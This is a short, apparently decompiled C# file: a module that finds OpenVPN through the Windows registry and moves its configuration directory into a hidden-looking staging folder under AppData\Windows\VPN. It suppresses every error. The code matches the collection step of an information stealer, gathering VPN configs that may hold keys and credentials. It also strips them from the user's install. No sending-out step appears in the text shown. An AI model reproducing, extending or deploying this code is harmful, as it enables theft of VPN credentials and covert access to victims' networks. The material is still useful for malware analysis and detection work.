using System;
using System.IO;
using Microsoft.Win32;

namespace opvpn
{
	// Token: 0x02000008 RID: 8
	internal class ovpn
	{
		// Token: 0x0600000D RID: 13 RVA: 0x000028CC File Offset: 0x00000ACC
		public static void openvpn()
		{
			try
			{
				RegistryKey localMachine = Registry.LocalMachine;
				string[] subKeyNames = localMachine.OpenSubKey("SOFTWARE").GetSubKeyNames();
				foreach (string a in subKeyNames)
				{
					bool flag = a == "OpenVPN";
					if (flag)
					{
						Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Windows/VPN/OpenVPN");
						try
						{
							string path = localMachine.OpenSubKey("SOFTWARE").OpenSubKey("OpenVPN").GetValue("config_dir").ToString();
							DirectoryInfo directoryInfo = new DirectoryInfo(path);
							directoryInfo.MoveTo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Windows\\VPN\\OpenVPN\\Config");
						}
						catch
						{
						}
					}
				}
			}
			catch
			{
			}
		}
	}
}
